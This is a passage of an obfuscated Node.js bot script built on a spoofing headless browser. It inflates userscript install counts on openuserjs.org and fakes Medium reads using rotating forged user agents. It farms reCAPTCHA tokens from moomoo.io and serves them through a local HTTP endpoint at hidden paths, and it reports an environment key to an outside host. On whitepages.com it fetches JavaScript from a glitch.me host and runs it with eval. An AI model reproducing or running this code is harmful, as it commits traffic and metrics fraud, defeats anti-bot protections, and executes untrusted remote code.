      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + V(0x1a) + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x8) + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + V(0x3)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + W(0x16, 'd8bo') + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + V(0x1b) + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + X(0x1d) + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + X(0x12) + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + X(0x18) + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + W(0x15, '[Z1M') + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x20bc + -0x2a0 * 0x3 + 0xac * -0x25
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1252 + 0x4 * -0x858 + 0x33b2)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x9 * 0x27 + -0x13cb * 0x1 + 0x12d0), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x36a + 0x263e + -0x2270), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x271 + -0x6 * 0x445 + -0xb * -0x28d;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x6 * 0xa3 + -0xd * 0x98 + 0x3e6; w < getRandomInt(-0x18 * 0xf1 + 0x19 * 0x111 + -0x14 * 0x34, 0x25f7 + 0xd48 * 0x1 + -0x333a); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x3a * 0x692 + 0xf * 0x1546 + 0x2 * -0xe8e7);
        }
      }();
    }, -0x9cd + -0x19 * -0xb2 + -0x7 * 0x107), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        const Y = d;
        axios['post'](Y(0x2) + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1359 + -0x220a * 0x1 + 0x4f * 0xad;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1 * -0x1605 + -0x675 + -0x1b * -0x10e, 0x19 * -0x17e + 0x425 * -0x1 + 0x29a5 * 0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x6 * -0x1ecb + 0x393 * -0x1 + -0x9db * -0x1f);
    }, -0x1627 + 0xa7c + -0x15 * -0x93), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x97c + 0x1 * -0x2547 + 0x1bcb;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1b2 * -0x7 + -0xff * -0x6 + -0x17 * -0xc4), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x421 * 0x7 + -0xa71 * -0x3 + 0xa * -0x3e), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x172 * 0xb0b + 0xed8d7 + 0xed8af);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0xe5 * -0x1b + -0x214f + 0x39da * 0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const Z = b,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1 * -0x250f + 0xa5a + 0xe3 * 0x1f);
    const j = Z(0xc, 'Wdm#') + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x12 * -0x51 + -0x23bf * -0x1 + -0x9e1);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = c;
  async function f() {
    const bc = {
        f: 'R0B^'
      },
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x197b + -0x13d * 0x11 + 0x2e89) {
        const a0 = b;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x30e * -0xb + 0x1fbe + 0x1dd));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x1e46 + 0x1815 + -0xfd * 0x37, D[a0(0x5, bc.f)]('\x20'));
        return B ? E['slice'](-0x206a + -0xf80 + 0x17f5 * 0x2, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x1787 + -0x2168 * 0x1 + 0xbb * 0x43),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x161 * 0x19 + 0x284 * 0x16 + -0x1 * -0x1231),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + a1(0x17) + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1dff * -0x1 + -0x11cc + 0x98f * 0x5; k < -0x1631 + -0x20d5 + -0x581 * -0xa; k++)
    setTimeout(f, (-0x1 * -0x5b3a + 0x19f0f + -0x3 * 0x5aa3) * k * getRandomInt(-0x23a0 + 0x21 * 0x4c + 0x19d5, 0x1 * -0xdd3 + 0x1050 + -0x27a));
  setInterval(() => {
    f();
    for (let l = 0x1e6d + -0x1f2c + 0xbf; l < -0x69f + 0x1422 + 0xd7f * -0x1; l++)
      setTimeout(f, (-0x11485 + -0xd949 + -0x2 * -0x16c17) * l * getRandomInt(-0x1 * 0x18f1 + 0x729 + 0x11c9, 0x55 * 0x36 + 0x1172 + -0x235d * 0x1));
  }, -0x4b50ef + -0x2 * -0x159e16 + 0x570343);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a2 = c,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents['random']()
      }
    });
  f['get'](miscSites[a2(0xd)](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
